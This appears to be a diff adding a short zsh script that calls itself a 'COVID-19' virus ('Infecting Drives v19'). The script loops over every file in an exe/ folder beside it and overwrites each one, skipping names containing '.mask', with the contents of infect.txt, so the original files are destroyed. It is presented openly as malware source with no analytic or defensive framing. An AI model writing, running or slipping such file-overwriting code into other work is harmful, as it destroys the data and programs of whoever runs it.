@@ -1,0 +1,21 @@
+#!/bin/zsh
+# COVID-19
+# Coronavirus Overtly Voracious; Infecting Drives v19 
+
+
+cdir="$(dirname "$0")"
+cd "$(dirname "$0")"
+
+
+FILES=exe/*
+
+for f in $(dirname "$0")/exe/*;  do 
+  echo $f
+
+  if grep -q ".mask" <<< "$f";then
+  	  echo "protected"
+  else
+          cat infect.txt > $f
+fi
+  sleep 0.2
+done
